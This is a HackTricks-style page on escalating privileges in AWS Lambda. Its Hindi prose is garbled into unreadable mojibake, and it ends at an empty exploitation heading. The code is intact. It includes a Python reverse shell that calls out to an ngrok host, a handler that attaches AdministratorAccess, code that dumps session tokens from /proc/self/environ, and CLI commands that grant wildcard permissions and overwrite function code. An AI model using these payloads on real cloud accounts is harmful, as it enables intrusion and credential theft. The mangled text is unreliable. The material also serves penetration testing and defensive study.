# AWS - Lambda Privesc

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## lambda

рд▓реИрдореНрдмрдбрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`, рдФрд░ `lambda:InvokeFunction`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рд╡реЗ **рдПрдХ рдирдпрд╛ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдПрдХ рдореМрдЬреВрджрд╛ IAM рднреВрдорд┐рдХрд╛ рд╕реМрдВрдк рд╕рдХрддреЗ рд╣реИрдВ**, рдЬрд┐рд╕рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЙрд╕ рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреА рд╣реИрдВред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд┐рд░ **рдЗрд╕ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдХреЛрдб рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рдХреЗ рд╕рд╛рде)**ред\
рдПрдХ рдмрд╛рд░ рдлрд╝рдВрдХреНрд╢рди рд╕реЗрдЯрдЕрдк рд╣реЛ рдЬрд╛рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ **рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ AWS API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдХреЗ рдЗрдЪреНрдЫрд┐рдд рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрд╕ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд╛рд░реНрдп рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрд╕рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд IAM рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдкреНрд░рджрддреНрдд рдкрд╣реБрдВрдЪ рд╕реНрддрд░ рдХреЗ рд╕рд╛рде рдХрд╛рд░реНрдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\\

рдПрдХ рд╣рдорд▓рд╛рд╡рддрд╛ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ **рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗ рдФрд░ рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХреЗ**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
рдЖрдк рд▓реИрдореНрдмрдбрд╛ рдлрдВрдХреНрд╢рди рд╕реЗ рд▓реИрдореНрдмрдбрд╛ рд░реЛрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ** рд╣реИрдВред\
рдЕрдЧрд░ рд▓реИрдореНрдмрдбрд╛ рд░реЛрд▓ рдореЗрдВ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдбреНрдорд┐рди рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд▓реИрдореНрдмрдбрд╛ рдХреА рднреВрдорд┐рдХрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдмрд╛рд╣рд░реА рдХрдиреЗрдХреНрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ **рдиреЗрдЯрд╡рд░реНрдХ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд▓реИрдореНрдмрдбрд╛** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реЛрдЧрд╛ рдЬреЛ рдЖрдВрддрд░рд┐рдХ рдХрд╛рд░реНрдпреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдпрджрд┐ рдЕрдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣ рдЖрдкрдХреЗ рдкрд▓рдЯреА рд╣реБрдИ рд╢реИрд▓реЛрдВ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдХреЛрдб рдЖрдкрдХреЛ рд╕реАрдзреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдЬреИрд╕реЗ рдХрд┐ рд▓реИрдореНрдмрдбрд╛ рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВред
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзрд╛ рд╡реГрджреНрдзрд┐ред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджреНрдпрдкрд┐ рдпрд╣ рджрд┐рдЦрдиреЗ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ **`lambda:InvokeAsync`** рдХреЗрд╡рд▓ рдЗрд╕реЗ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ рдХрд┐ **`aws lambda invoke-async`** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ, рдЖрдкрдХреЛ `lambda:InvokeFunction` рднреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

рдкрд┐рдЫрд▓реЗ рд╕реНрдерд┐рддрд┐ рдХреА рддрд░рд╣, рдЖрдк рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рд╣реИ рддреЛ рдЖрдк рдЦреБрдж рдХреЛ `lambda:InvokeFunction` рдЕрдиреБрдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рд╣реИ **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╡рд┐рд╢рд┐рд╖реНрдЯ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЛ рд╕реАрдзреЗ рдЙрдиреНрдирдд рдХрд░рдирд╛ред

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, рдФрд░ `lambda:CreateEventSourceMapping`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ `dynamodb:PutItem` рдФрд░ `dynamodb:CreateTable`) рдмрд┐рдирд╛ `lambda:InvokeFunction` рдХреЗ рднреА рд╕реАрдзреЗ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рд╡реЗ рдПрдХ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА рдХреЛрдб рдХреЗ рд╕рд╛рде рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдПрдХ рдореМрдЬреВрджрд╛ IAM рднреВрдорд┐рдХрд╛ рд╕реМрдВрдк рд╕рдХрддреЗ рд╣реИрдВред

рд▓реИрдореНрдмрдбрд╛ рдХреЛ рд╕реАрдзреЗ рдирд╣реАрдВ рдмреБрд▓рд╛рдиреЗ рдХреА рдмрдЬрд╛рдп, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдореМрдЬреВрджрд╛ рдбрд╛рдЗрдирд╛рдореЛрдбреАрдмреА рддрд╛рд▓рд┐рдХрд╛ рд╕реЗрдЯрдЕрдк рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдЙрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд▓реИрдореНрдмрдбрд╛ рдХреЛ рдПрдХ рдШрдЯрдирд╛ рд╕реНрд░реЛрдд рдореИрдкрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕реЗрдЯрдЕрдк рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд▓реИрдореНрдмрдбрд╛ рд╕рдорд╛рд░реЛрд╣ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдирдП рдЖрдЗрдЯрдо рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдкрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ, рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛, рдЗрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реИрдореНрдмрдбрд╛ рд╕рдорд╛рд░реЛрд╣ рдХреЛ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд░реВрдк рд╕реЗ рдмреБрд▓рд╛рдХрд░ рдФрд░ рдкрд╛рд░рд┐рдд IAM рднреВрдорд┐рдХрд╛ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХреЛрдб рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
рдпрджрд┐ DynamoDB рдкрд╣рд▓реЗ рд╕реЗ рд╣реА AWS рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд╕рдХреНрд░рд┐рдп рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреЗрд╡рд▓ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдШрдЯрдирд╛ рд╕реНрд░реЛрдд рдореИрдкрд┐рдВрдЧ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА **рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ DynamoDB рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдирдпрд╛ рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рдирд╛** рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рд╕реНрдЯреНрд░реАрдорд┐рдВрдЧ рд╕рдХреНрд╖рдо рд╣реЛред
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
рдЕрдм рдпрд╣ рд╕рдВрднрд╡ рд╣реИ **рд▓реИрдореНрдмрдбрд╛ рдлрдВрдХреНрд╢рди рдХреЛ рдбрд╛рдЗрдирд╛рдореЛрдбреАрдмреА рдЯреЗрдмрд▓ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдирд╛** рдПрдХ **рдЗрд╡реЗрдВрдЯ рд╕реЛрд░реНрд╕ рдореИрдкрд┐рдВрдЧ рдмрдирд╛рдХрд░**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda рдлрдВрдХреНрд╢рди рдЬреЛ рдбрд╛рдЗрдирд╛рдореЛрдбреАрдмреА рд╕реНрдЯреНрд░реАрдо рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реИ, рд╣рдорд▓рд╛рд╡рддрд╛ **рдбрд╛рдЗрдирд╛рдореЛрдбреАрдмреА рд╕реНрдЯреНрд░реАрдо рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдХреЗ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рд▓реИрдореНрдмрдбрд╛ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдЗрд╕реЗ **рдбрд╛рдЗрдирд╛рдореЛрдбреАрдмреА рдЯреЗрдмрд▓ рдореЗрдВ рдЖрдЗрдЯрдо рдбрд╛рд▓рдХрд░** рдкреВрд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЛ рд╕реАрдзрд╛ рдЙрдиреНрдирддрд┐ рджреЗрдирд╛ред

### `lambda:AddPermission`

рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдЦреБрдж рдХреЛ (рдпрд╛ рдЕрдиреНрдпреЛрдВ рдХреЛ) рдХрд┐рд╕реА рднреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗ рд╕рдХрддрд╛ рд╣реИ** (рдпрд╣ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╕рд╛рдзрди рдЖрдзрд╛рд░рд┐рдд рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдХрд░ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐ред

### `lambda:AddLayerVersionPermission`

рдЗрд╕ рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЦреБрдж рдХреЛ (рдпрд╛ рдЕрдиреНрдпреЛрдВ рдХреЛ) `lambda:GetLayerVersion` рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреА рд╕рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рд╡рд╣ рдкрд░рдд рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдпрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЦреЛрдЬ рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪред

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** рдЕрдиреБрдорддрд┐ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдПрдХ рдореМрдЬреВрджрд╛ Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕рдВрдмрдВрдзрд┐рдд IAM рднреВрдорд┐рдХрд╛ рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИ, рдХреЛрдб рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред**\
рд╣рдорд▓рд╛рд╡рд░ **IAM рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд▓реИрдореНрдмрдбрд╛ рдХреЛрдб рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рд╕реАрдзреА рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рдХрд┐ рд╡рд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрд╣реНрд╡рд╛рди рдХрд░реЗрдВ, рдпрджрд┐ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдкреВрд░реНрд╡ рдореМрдЬреВрдж рд╣реИ рдФрд░ рд╕рдВрдЪрд╛рд▓рдирдпреЛрдЧреНрдп рд╣реИ, рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдпрд╣ рдореМрдЬреВрджрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдпрд╛ рдШрдЯрдирд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХреЛрдб рдХрд╛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╕рдВрднрд╡ рд╣реЛред

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЛ рд╕реАрдзреЗ рдмрдврд╝рд╛рд╡рд╛ред

### `lambda:UpdateFunctionConfiguration`

#### рдкрд░рд┐рдЪрдп

[**рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░реНрд╕**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) рдЖрдкрдХреЛ рдЕрдкрдиреЗ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ **рдХреЛрдб** рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕реЗ **рдЕрд▓рдЧ рд╕реЗ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИ**, рддрд╛рдХрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЛрдб рдЫреЛрдЯрд╛ рд░рд╣ рд╕рдХреЗ рдФрд░ **рдХрдИ рдлрд╝рдВрдХреНрд╢рди рдХреЛрдб рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

рд▓реИрдореНрдмрдбрд╛ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХреЗ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдкрд╛рдпрдерди рдХреЛрдб рд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рд╕реНрдерд╛рдиреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
рдпреЗ рд╣реИрдВ рд╕реНрдерд╛рди:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреБрд╕реНрддрдХрд╛рд▓рдп boto3 `/var/runtime/boto3` рд╕реЗ рд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИ (4 рд╡реЗрдВ рд╕реНрдерд╛рди рдкрд░)ред

#### рд╢реЛрд╖рдг

